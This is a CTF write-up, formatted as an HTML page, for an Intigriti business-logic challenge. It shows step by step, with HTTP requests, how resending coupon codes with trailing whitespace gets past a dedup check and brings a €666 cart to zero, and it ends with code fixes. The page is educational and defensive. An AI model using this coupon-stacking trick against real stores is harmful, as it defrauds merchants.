@@ -1,0 +1,741 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Business Logic Flaw in Cart Discounts — CTF Writeup</title>
+<style>
+  :root {
+    --sage-dark:   #659287;
+    --sage-mid:    #88BDA4;
+    --sage-light:  #B1D3B9;
+    --sage-pale:   #E6F2DD;
+    --ink:         #1c2d27;
+    --ink-mid:     #3a5048;
+    --ink-light:   #5a7068;
+    --surface:     #f4fbf0;
+    --border:      #c8dfc9;
+    --border-mid:  #a8cdb0;
+    --mono: 'SF Mono','Fira Code',Menlo,Consolas,monospace;
+    --sans: -apple-system,BlinkMacSystemFont,'SF Pro Text','Helvetica Neue',sans-serif;
+  }
+
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  html { font-size: 16px; -webkit-font-smoothing: antialiased; }
+
+  body {
+    background: var(--sage-pale);
+    color: var(--ink);
+    font-family: var(--sans);
+    font-size: 1rem;
+    line-height: 1.75;
+    max-width: 800px;
+    margin: 0 auto;
+    padding: 72px 32px 112px;
+  }
+
+  .eyebrow {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    margin-bottom: 20px;
+    font-size: 0.72rem;
+    font-weight: 600;
+    letter-spacing: 0.12em;
+    text-transform: uppercase;
+    color: var(--sage-dark);
+  }
+  .eyebrow-line {
+    width: 24px; height: 1.5px;
+    background: var(--sage-dark);
+    flex-shrink: 0;
+  }
+
+  h1 {
+    font-size: 2rem;
+    font-weight: 700;
+    letter-spacing: -0.03em;
+    line-height: 1.2;
+    color: var(--ink);
+    margin-bottom: 16px;
+  }
+
+  .lede {
+    font-size: 1rem;
+    color: var(--ink-mid);
+    line-height: 1.7;
+    margin-bottom: 28px;
+    max-width: 620px;
+    border-left: 2px solid var(--sage-dark);
+    padding-left: 16px;
+  }
+
+  .chips {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 6px;
+    margin-bottom: 52px;
+  }
+
+  .chip {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 5px 12px;
+    font-size: 0.77rem;
+    color: var(--ink-mid);
+    font-weight: 500;
+  }
+  .chip svg { color: var(--sage-dark); flex-shrink: 0; }
+
+  hr { border: none; border-top: 1px solid var(--border); margin: 48px 0; }
+
+  h2 {
+    font-size: 1.15rem;
+    font-weight: 700;
+    letter-spacing: -0.02em;
+    color: var(--ink);
+    margin: 48px 0 14px;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+  h2::before {
+    content: '';
+    display: inline-block;
+    width: 4px; height: 18px;
+    background: var(--sage-dark);
+    border-radius: 2px;
+    flex-shrink: 0;
+  }
+
+  h3 {
+    font-size: 0.72rem;
+    font-weight: 700;
+    letter-spacing: 0.1em;
+    text-transform: uppercase;
+    color: var(--sage-dark);
+    margin: 32px 0 10px;
+  }
+
+  p { color: var(--ink-mid); font-size: 0.97rem; margin-bottom: 14px; }
+  p:last-child { margin-bottom: 0; }
+  strong { color: var(--ink); font-weight: 600; }
+  a { color: var(--sage-dark); text-decoration: underline; text-decoration-color: var(--sage-light); }
+  ul, ol { padding-left: 20px; color: var(--ink-mid); font-size: 0.97rem; margin-bottom: 14px; }
+  li { margin-bottom: 7px; }
+
+  code {
+    font-family: var(--mono);
+    font-size: 0.82em;
+    background: var(--sage-light);
+    border-radius: 4px;
+    padding: 1px 6px;
+    color: var(--ink);
+  }
+
+  .code-block { margin: 16px 0 24px; }
+
+  .code-tab {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    background: var(--sage-mid);
+    border-radius: 6px 6px 0 0;
+    padding: 5px 14px;
+    font-family: var(--mono);
+    font-size: 0.68rem;
+    color: var(--surface);
+    font-weight: 600;
+    letter-spacing: 0.04em;
+    text-transform: uppercase;
+  }
+  .code-tab svg { opacity: 0.8; }
+
+  pre {
+    background: var(--ink);
+    border-radius: 0 6px 6px 6px;
+    padding: 18px 20px;
+    overflow-x: auto;
+    font-family: var(--mono);
+    font-size: 0.82rem;
+    line-height: 1.65;
+    color: var(--sage-light);
+  }
+
+  .code-block.bare pre { border-radius: 6px; }
+
+  pre .hl  { color: #f0d080; font-weight: 600; }
+  pre .key { color: #88BDA4; }
+  pre .val { color: #a8d8b0; }
+  pre .cmt { color: #5a7060; font-style: italic; }
+  pre .bad { color: #e08080; }
+  pre .hdr { color: #b0c8ff; }
+  pre .dim { color: #4a6055; }
+  pre .ws  { background: #5a3030; border-radius: 2px; }
+
+  .claim {
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    overflow: hidden;
+    margin: 18px 0 26px;
+    background: var(--surface);
+  }
+
+  .claim-header {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    padding: 13px 18px;
+    background: var(--sage-light);
+    border-bottom: 1px solid var(--border);
+  }
+
+  .claim-num {
+    width: 22px; height: 22px;
+    border-radius: 50%;
+    background: var(--sage-dark);
+    color: #fff;
+    font-size: 0.72rem;
+    font-weight: 700;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-shrink: 0;
+  }
+
+  .claim-title {
+    font-size: 0.88rem;
+    font-weight: 600;
+    color: var(--ink);
+  }
+
+  .claim-body { padding: 18px 20px; }
+  .claim-body pre { margin: 12px 0; border-radius: 6px; }
+  .claim-body p { margin-bottom: 10px; }
+
+  .table-wrap {
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    overflow: hidden;
+    margin: 14px 0 18px;
+    background: var(--surface);
+  }
+
+  table { width: 100%; border-collapse: collapse; font-size: 0.85rem; }
+  thead tr { background: var(--sage-light); border-bottom: 1px solid var(--border-mid); }
+  th {
+    text-align: left;
+    padding: 10px 16px;
+    color: var(--ink);
+    font-weight: 600;
+    font-size: 0.72rem;
+    letter-spacing: 0.07em;
+    text-transform: uppercase;
+  }
+  td {
+    padding: 9px 16px;
+    border-bottom: 1px solid var(--border);
+    color: var(--ink-mid);
+    font-family: var(--mono);
+    font-size: 0.8rem;
+  }
+  tr:last-child td { border-bottom: none; }
+  td.num { text-align: right; }
+
+  .pass { display: inline-flex; align-items: center; gap: 5px; color: #2a7a50; font-weight: 600; font-family: var(--sans); font-size: 0.8rem; }
+  .fail { display: inline-flex; align-items: center; gap: 5px; color: #b04040; font-weight: 600; font-family: var(--sans); font-size: 0.8rem; }
+
+  .step { display: flex; gap: 16px; margin-bottom: 34px; align-items: flex-start; }
+
+  .step-num {
+    width: 28px; height: 28px;
+    border-radius: 50%;
+    border: 1.5px solid var(--sage-mid);
+    color: var(--sage-dark);
+    font-size: 0.78rem;
+    font-weight: 700;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-shrink: 0;
+    margin-top: 1px;
+    background: var(--surface);
+  }
+
+  .step-content { flex: 1; min-width: 0; }
+  .step-title { font-size: 0.95rem; font-weight: 600; color: var(--ink); margin-bottom: 10px; }
+
+  .flag-card {
+    display: flex;
+    align-items: center;
+    gap: 18px;
+    background: var(--sage-light);
+    border: 1px solid var(--sage-mid);
+    border-radius: 10px;
+    padding: 20px 24px;
+    margin: 22px 0 30px;
+  }
+  .flag-label {
+    font-size: 0.68rem;
+    font-weight: 700;
+    letter-spacing: 0.1em;
+    text-transform: uppercase;
+    color: var(--sage-dark);
+    margin-bottom: 5px;
+  }
+  .flag-value {
+    font-family: var(--mono);
+    font-size: 0.95rem;
+    color: var(--ink);
+    font-weight: 600;
+    letter-spacing: 0.02em;
+  }
+
+  .callout {
+    display: flex;
+    gap: 12px;
+    align-items: flex-start;
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-left: 3px solid var(--sage-dark);
+    border-radius: 0 8px 8px 0;
+    padding: 14px 18px;
+    margin: 18px 0;
+    font-size: 0.92rem;
+    color: var(--ink-mid);
+  }
+  .callout svg { flex-shrink: 0; margin-top: 2px; color: var(--sage-dark); }
+
+  .diagram {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 32px 24px 28px;
+    margin: 24px 0 32px;
+    overflow-x: auto;
+  }
+  .diagram-label {
+    font-size: 0.68rem;
+    font-weight: 700;
+    letter-spacing: 0.12em;
+    text-transform: uppercase;
+    color: var(--sage-dark);
+    text-align: center;
+    margin-bottom: 28px;
+  }
+
+  .fix { display: flex; gap: 14px; align-items: flex-start; margin-bottom: 30px; }
+  .fix-num {
+    width: 24px; height: 24px;
+    border-radius: 50%;
+    background: var(--sage-light);
+    border: 1.5px solid var(--sage-mid);
+    color: var(--sage-dark);
+    font-size: 0.72rem;
+    font-weight: 700;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-shrink: 0;
+    margin-top: 2px;
+  }
+  .fix-content { flex: 1; min-width: 0; }
+  .fix-title { font-size: 0.9rem; font-weight: 600; color: var(--ink); margin-bottom: 10px; }
+
+  .learn {
+    background: var(--sage-light);
+    border-radius: 8px;
+    padding: 13px 16px;
+    margin: 16px 0 0;
+    font-size: 0.87rem;
+    color: var(--ink-mid);
+    display: flex;
+    gap: 10px;
+    align-items: flex-start;
+  }
+  .learn svg { flex-shrink: 0; margin-top: 2px; color: var(--sage-dark); }
+  .learn strong { color: var(--ink); }
+
+  footer {
+    margin-top: 64px;
+    padding-top: 22px;
+    border-top: 1px solid var(--border);
+    font-size: 0.78rem;
+    color: var(--ink-light);
+    display: flex;
+    justify-content: space-between;
+    flex-wrap: wrap;
+    gap: 8px;
+  }
+</style>
+</head>
+<body>
+
+<!-- ── HEADER ── -->
+<div class="eyebrow">
+  <span class="eyebrow-line"></span>
+  Intigriti CTF &nbsp;·&nbsp; October 2026 &nbsp;·&nbsp; Business Logic
+</div>
+
+<h1>Two checks, one truth they forgot to share</h1>
+
+<p class="lede">
+  A coupon endpoint is really two functions wearing one route: "is this code
+  real?" and "have I already used it?" Both are supposed to agree on what a
+  code <em>is</em>. Here they didn't — and the gap between them was exactly
+  one whitespace character wide, twice over, which was all it took to turn a
+  capped 50% discount into a free checkout.
+</p>
+
+<div class="chips">
+  <span class="chip">
+    <svg width="12" height="12" viewBox="0 0 16 16" fill="none"><path d="M2 13l4-4 3 3 5-6" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/><path d="M11 5h3v3" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
+    Business Logic Error
+  </span>
+  <span class="chip">
+    <svg width="12" height="12" viewBox="0 0 16 16" fill="none"><path d="M8 2L2 6v4c0 3 2.5 5.5 6 6 3.5-.5 6-3 6-6V6L8 2z" stroke="currentColor" stroke-width="1.5" stroke-linejoin="round"/></svg>
+    Medium
+  </span>
+  <span class="chip">
+    <svg width="12" height="12" viewBox="0 0 16 16" fill="none"><path d="M2 3h12v10H2z" stroke="currentColor" stroke-width="1.5" rx="1"/></svg>
+    challenge-1026.challenges.intigriti.io
+  </span>
+</div>
+
+<hr>
+
+<!-- ── THE APP ── -->
+<h2>The Setup</h2>
+
+<p>
+  A minimal storefront, one hero item: the <strong>Midnight Collection</strong>
+  at <strong>€666.00</strong>. Every visitor is dropped in with
+  <strong>€66.00</strong> of credit — a tenth of the price, a deliberate
+  signal that the challenge is about discounts, not balance.
+</p>
+
+<p>
+  Two coupons exist. <code>NIGHT20</code> sits in plain sight in the site
+  banner. <code>NEWS30</code> takes one extra step — submit any email to
+  <code>POST /api/newsletter</code> and it comes back in the response. Both
+  apply through <code>POST /api/cart/coupon</code>, and the app's own math
+  caps a combined application of both at 50% off. Getting to zero means
+  finding a way past that cap.
+</p>
+
+<!-- ── OVERVIEW ── -->
+<h2>Where the Two Checks Disagree</h2>
+
+<p>
+  Tracing <code>/api/cart/coupon</code>'s handling of the <code>code</code>
+  field turns up two separate questions it answers, using two different
+  versions of the same input:
+</p>
+<ul>
+  <li><strong>"Is it real?"</strong> — answered against a <em>trimmed</em> copy of the code.</li>
+  <li><strong>"Have I seen it before?"</strong> — answered against the <em>raw</em>, un-trimmed code.</li>
+</ul>
+<p>
+  Feed it <code>"NIGHT20 "</code> (one trailing space) and the first check
+  says yes, that's NIGHT20, 20% off is real. The second check compares the
+  literal string against what's already been recorded, sees a string it's
+  never stored before, and says no, this isn't a repeat. Testing further
+  variants (double spaces, leading spaces, tabs) showed the same gap holds
+  for each — but only once per variant tried; it isn't an unlimited stack,
+  it's exactly one extra application per distinct way of writing the code.
+</p>
+
+<hr>
+
+<!-- ── EVIDENCE ── -->
+<h2>Evidence</h2>
+
+<div class="claim">
+  <div class="claim-header">
+    <div class="claim-num">1</div>
+    <div class="claim-title">The dedup check works — for an exact match</div>
+  </div>
+  <div class="claim-body">
+    <div class="code-block">
+      <div class="code-tab">
+        <svg width="9" height="9" viewBox="0 0 16 16" fill="none"><path d="M2 8h12M8 2l6 6-6 6" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
+        Request
+      </div>
+      <pre><span class="key">POST</span> /api/cart/coupon HTTP/1.1
+Host: challenge-1026.challenges.intigriti.io
+Content-Type: application/json
+
+{"code":"NIGHT20"}   <span class="cmt">// sent twice, identical</span></pre>
+    </div>
+    <div class="code-block bare">
+      <pre>HTTP/1.1 <span class="val">200 OK</span>            <span class="cmt">← first: discount applied</span>
+HTTP/1.1 <span class="bad">400 Bad Request</span>   <span class="cmt">← second: "Coupon already applied"</span></pre>
+    </div>
+    <p>So there is a real guard here, not a missing one — it just answers a narrower question than it thinks it does.</p>
+  </div>
+</div>
+
+<div class="claim">
+  <div class="claim-header">
+    <div class="claim-num">2</div>
+    <div class="claim-title">One space is enough to look like a new code</div>
+  </div>
+  <div class="claim-body">
+    <div class="code-block">
+      <div class="code-tab">
+        <svg width="9" height="9" viewBox="0 0 16 16" fill="none"><path d="M2 8h12M8 2l6 6-6 6" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
+        Request
+      </div>
+      <pre><span class="key">POST</span> /api/cart/coupon HTTP/1.1
+Host: challenge-1026.challenges.intigriti.io
+Content-Type: application/json
+
+{"code":"NIGHT20<span class="ws"> </span>"}</pre>
+    </div>
+    <div class="code-block bare">
+      <pre>HTTP/1.1 <span class="val">200 OK</span>
+{"discount": "20%", "cartTotal": "399.60"}   <span class="cmt">← accepted as a fresh coupon</span></pre>
+    </div>
+    <div class="learn">
+      <svg width="14" height="14" viewBox="0 0 16 16" fill="none"><circle cx="8" cy="8" r="6.5" stroke="currentColor" stroke-width="1.5"/><path d="M8 7v4M8 5.5v.5" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/></svg>
+      <span><strong>Why it matters:</strong> normalization that's applied in one place and assumed everywhere else isn't normalization — it's a second, hidden definition of "the same input" that nobody reconciled.</span>
+    </div>
+  </div>
+</div>
+
+<div class="claim">
+  <div class="claim-header">
+    <div class="claim-num">3</div>
+    <div class="claim-title">It caps at double, not infinite — and that's still enough</div>
+  </div>
+  <div class="claim-body">
+    <div class="table-wrap">
+      <table>
+        <thead><tr><th>Call</th><th>Payload</th><th>Result</th><th class="num">Running Discount</th></tr></thead>
+        <tbody>
+          <tr><td>1</td><td>{"code":"NIGHT20"}</td><td><span class="pass"><svg width="11" height="11" viewBox="0 0 16 16" fill="none"><path d="M3 8l3.5 3.5L13 5" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>Applied</span></td><td class="num">20%</td></tr>
+          <tr><td>2</td><td>{"code":"NEWS30"}</td><td><span class="pass"><svg width="11" height="11" viewBox="0 0 16 16" fill="none"><path d="M3 8l3.5 3.5L13 5" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>Applied</span></td><td class="num">50%</td></tr>
+          <tr><td>3</td><td>{"code":"NIGHT20&nbsp;"}</td><td><span class="pass"><svg width="11" height="11" viewBox="0 0 16 16" fill="none"><path d="M3 8l3.5 3.5L13 5" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>Applied</span></td><td class="num">70%</td></tr>
+          <tr><td>4</td><td>{"code":"NEWS30&nbsp;"}</td><td><span class="pass"><svg width="11" height="11" viewBox="0 0 16 16" fill="none"><path d="M3 8l3.5 3.5L13 5" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>Applied</span></td><td class="num" style="color:#2a7a50;font-weight:700;">100%</td></tr>
+          <tr><td>5</td><td>{"code":"NIGHT20&nbsp;&nbsp;"} (2 spaces)</td><td><span class="fail"><svg width="11" height="11" viewBox="0 0 16 16" fill="none"><path d="M4 4l8 8M12 4l-8 8" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>Rejected — cart already 100%</span></td><td class="num">100%</td></tr>
+        </tbody>
+      </table>
+    </div>
+    <p>With only two coupons in the system, each good for one bonus application, the ceiling the bug allows happens to land exactly on 100%. A store with more codes, or looser coupon math, could go further — but this challenge only needed the two.</p>
+  </div>
+</div>
+
+<hr>
+
+<!-- ── EXPLOIT ── -->
+<h2>Walking Through It</h2>
+
+<div class="diagram">
+  <div class="diagram-label">From €666.00 to €0.00</div>
+  <svg viewBox="0 0 720 130" xmlns="http://www.w3.org/2000/svg"
+       style="width:100%;max-width:720px;display:block;margin:0 auto;font-family:-apple-system,BlinkMacSystemFont,'Helvetica Neue',sans-serif">
+
+    <line x1="60" y1="52" x2="660" y2="52" stroke="#B1D3B9" stroke-width="2"/>
+
+    <circle cx="60" cy="52" r="18" fill="#659287" stroke="#E6F2DD" stroke-width="2"/>
+    <path d="M53 48h8l2 4-2 4h-8l-2-4z" fill="none" stroke="#E6F2DD" stroke-width="1.4" stroke-linejoin="round"/>
+    <text x="60" y="86" text-anchor="middle" fill="#3a5048" font-size="10" font-weight="600">Cart opened</text>
+    <text x="60" y="98" text-anchor="middle" fill="#88BDA4" font-size="8.5">€666.00</text>
+
+    <circle cx="210" cy="52" r="18" fill="#659287" stroke="#E6F2DD" stroke-width="2"/>
+    <text x="210" y="57" text-anchor="middle" fill="#E6F2DD" font-size="12" font-weight="700" font-family="'SF Mono',Menlo,monospace">x2</text>
+    <text x="210" y="86" text-anchor="middle" fill="#3a5048" font-size="10" font-weight="600">Codes applied clean</text>
+    <text x="210" y="98" text-anchor="middle" fill="#88BDA4" font-size="8.5">NIGHT20 + NEWS30 → 50%</text>
+
+    <circle cx="370" cy="52" r="18" fill="#3a5048" stroke="#E6F2DD" stroke-width="2"/>
+    <text x="370" y="56" text-anchor="middle" fill="#E6F2DD" font-size="13" font-weight="700" font-family="'SF Mono',Menlo,monospace">␣</text>
+    <text x="370" y="86" text-anchor="middle" fill="#3a5048" font-size="10" font-weight="600">Codes applied again</text>
+    <text x="370" y="98" text-anchor="middle" fill="#88BDA4" font-size="8.5">+ trailing space → +50%</text>
+
+    <circle cx="530" cy="52" r="18" fill="#659287" stroke="#E6F2DD" stroke-width="2"/>
+    <path d="M524 48h8l-3 5h5l-8 8 2-6h-5z" fill="#E6F2DD"/>
+    <text x="530" y="86" text-anchor="middle" fill="#3a5048" font-size="10" font-weight="600">Cart hits 0</text>
+    <text x="530" y="98" text-anchor="middle" fill="#88BDA4" font-size="8.5">100% discount</text>
+
+    <circle cx="660" cy="52" r="18" fill="#659287" stroke="#E6F2DD" stroke-width="2"/>
+    <path d="M654 44v16M654 44h9l-2.5 4 2.5 4h-9" fill="none" stroke="#E6F2DD" stroke-width="1.4" stroke-linecap="round" stroke-linejoin="round"/>
+    <text x="660" y="86" text-anchor="middle" fill="#3a5048" font-size="10" font-weight="600">Checkout clears</text>
+    <text x="660" y="98" text-anchor="middle" fill="#88BDA4" font-size="8.5">Flag returned</text>
+
+    <text x="60"  y="24" text-anchor="middle" fill="#659287" font-size="8" font-weight="700" letter-spacing="0.06em">1</text>
+    <text x="210" y="24" text-anchor="middle" fill="#659287" font-size="8" font-weight="700" letter-spacing="0.06em">2</text>
+    <text x="370" y="24" text-anchor="middle" fill="#659287" font-size="8" font-weight="700" letter-spacing="0.06em">3</text>
+    <text x="530" y="24" text-anchor="middle" fill="#659287" font-size="8" font-weight="700" letter-spacing="0.06em">4</text>
+    <text x="660" y="24" text-anchor="middle" fill="#659287" font-size="8" font-weight="700" letter-spacing="0.06em">5</text>
+  </svg>
+</div>
+
+<div class="step">
+  <div class="step-num">1</div>
+  <div class="step-content">
+    <div class="step-title">Put the Midnight Collection in the cart</div>
+    <div class="code-block bare">
+      <pre><span class="key">POST</span> /api/cart/items HTTP/1.1
+Host: challenge-1026.challenges.intigriti.io
+Content-Type: application/json
+
+{"productId":"midnight-vault"}
+
+<span class="cmt">→ 200 OK · cartTotal: "666.00"</span></pre>
+    </div>
+  </div>
+</div>
+
+<div class="step">
+  <div class="step-num">2</div>
+  <div class="step-content">
+    <div class="step-title">Pick up the second coupon from the newsletter form</div>
+    <div class="code-block bare">
+      <pre><span class="key">POST</span> /api/newsletter HTTP/1.1
+Host: challenge-1026.challenges.intigriti.io
+Content-Type: application/json
+
+{"email":"a@a.com"}
+
+<span class="cmt">→ 200 OK · {"code": "NEWS30"}</span></pre>
+    </div>
+  </div>
+</div>
+
+<div class="step">
+  <div class="step-num">3</div>
+  <div class="step-content">
+    <div class="step-title">Apply both codes the intended way — lands at the 50% cap</div>
+    <div class="code-block bare">
+      <pre><span class="key">POST</span> /api/cart/coupon  {"code":"NIGHT20"}
+<span class="cmt">→ 200 OK · 20% · cartTotal: 532.80</span>
+
+<span class="key">POST</span> /api/cart/coupon  {"code":"NEWS30"}
+<span class="cmt">→ 200 OK · 50% total · cartTotal: 333.00</span></pre>
+    </div>
+  </div>
+</div>
+
+<div class="step">
+  <div class="step-num">4</div>
+  <div class="step-content">
+    <div class="step-title">Resend both codes with a trailing space — past the cap</div>
+    <div class="code-block bare">
+      <pre><span class="key">POST</span> /api/cart/coupon  {"code":"NIGHT20<span class="ws"> </span>"}
+<span class="cmt">→ 200 OK · 70% total · cartTotal: 199.80</span>
+
+<span class="key">POST</span> /api/cart/coupon  {"code":"NEWS30<span class="ws"> </span>"}
+<span class="cmt">→ 200 OK · 100% total · cartTotal: 0.00</span></pre>
+    </div>
+  </div>
+</div>
+
+<div class="step">
+  <div class="step-num">5</div>
+  <div class="step-content">
+    <div class="step-title">Check out — nothing left to pay</div>
+    <div class="code-block">
+      <div class="code-tab">
+        <svg width="9" height="9" viewBox="0 0 16 16" fill="none"><path d="M2 8h12M8 2l6 6-6 6" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
+        POST /api/checkout
+      </div>
+      <pre>{}
+
+HTTP/1.1 <span class="val">200 OK</span>
+<span class="hl">{"order": "confirmed", "charged": "0.00", "creditRemaining": "66.00",
+ "flag": "INTIGRITI{094638e6-ba2f-4c50-8bb4-41ced0d5debd}"}</span></pre>
+    </div>
+    <div class="flag-card">
+      <svg width="22" height="22" viewBox="0 0 24 24" fill="none" style="flex-shrink:0;color:#659287">
+        <path d="M4 4v16M4 4h11l-2 4 2 4H4" stroke="currentColor" stroke-width="1.75" stroke-linecap="round" stroke-linejoin="round"/>
+      </svg>
+      <div>
+        <div class="flag-label">Flag</div>
+        <div class="flag-value">INTIGRITI{094638e6-ba2f-4c50-8bb4-41ced0d5debd}</div>
+      </div>
+    </div>
+    <p>The starting €66.00 credit is never drawn on — the order clears entirely on a cart that's already at zero.</p>
+  </div>
+</div>
+
+<hr>
+
+<!-- ── IMPACT ── -->
+<h2>Why This Isn't Just a Curiosity</h2>
+<p>
+  The practical ceiling here — exactly double, not unlimited — comes from this
+  specific store having exactly two coupons and a 50% combined cap. The
+  underlying bug has no such ceiling: it's a property of how the dedup check
+  compares strings, not of how many coupons exist. Add a third promo code to
+  a real store running this logic, or let the discount math exceed 100% by
+  accident, and the same whitespace trick keeps paying out past free into
+  negative-price territory. The fix has to close the string-comparison gap
+  itself, not just the two-coupon math that happens to cap it here.
+</p>
+
+<hr>
+
+<!-- ── FIX ── -->
+<h2>Closing the Gap</h2>
+
+<div class="fix">
+  <div class="fix-num">1</div>
+  <div class="fix-content">
+    <div class="fix-title">Normalize before either check runs, and reuse that exact value</div>
+    <p style="margin-bottom:10px;">Trim and lowercase the code once, at the top of the handler, and let both the validity check and the dedup check read from that single normalized variable — never the original input again.</p>
+    <div class="code-block bare">
+      <pre><span class="key">const</span> normalized = code.trim().toUpperCase();
+
+<span class="key">if</span> (!KNOWN_CODES.has(normalized))
+  <span class="key">throw</span> <span class="val">'Invalid coupon'</span>;
+
+<span class="key">if</span> (appliedCodes.has(normalized))
+  <span class="key">throw</span> <span class="val">'Coupon already applied'</span>;
+
+appliedCodes.add(normalized);</pre>
+    </div>
+  </div>
+</div>
+
+<div class="fix">
+  <div class="fix-num">2</div>
+  <div class="fix-content">
+    <div class="fix-title">Make the stacking limit a real, server-side number</div>
+    <p style="margin-bottom:10px;">A Set only answers "have I seen this exact key before" — it isn't a stacking policy. If any code is meant to apply more than once, say so explicitly with a counted limit, not an implicit side effect of how the dedup check happens to compare values.</p>
+    <div class="code-block bare">
+      <pre><span class="key">const</span> MAX_USES_PER_CODE = 1;
+<span class="key">const</span> uses = appliedCodes.get(normalized) ?? 0;
+<span class="key">if</span> (uses >= MAX_USES_PER_CODE)
+  <span class="key">throw</span> <span class="val">'Coupon already applied'</span>;
+appliedCodes.set(normalized, uses + 1);</pre>
+    </div>
+  </div>
+</div>
+
+<div class="callout">
+  <svg width="14" height="14" viewBox="0 0 16 16" fill="none">
+    <path d="M3 8l3.5 3.5L13 5" stroke="currentColor" stroke-width="1.75" stroke-linecap="round" stroke-linejoin="round"/>
+  </svg>
+  <span>
+    Fix 1 removes the discrepancy entirely. Fix 2 is the belt-and-suspenders
+    version — it turns "how many times can this apply" from an accident of
+    string comparison into a number someone actually chose.
+  </span>
+</div>
+
+<hr>
+<footer>
+  <span>Intigriti Challenge 1026 — Business Logic Error &nbsp;·&nbsp; October 2026</span>
+  <span>
+    <a href="https://app.intigriti.com/researcher/profile/rawsid1106" style="color:var(--sage-dark)">rawsid1106</a>
+    &nbsp;·&nbsp;
+    <a href="https://challenge-1026.challenges.intigriti.io" style="color:var(--sage-dark)">challenge-1026.challenges.intigriti.io</a>
+  </span>
+</footer>
+
+</body>
+</html>
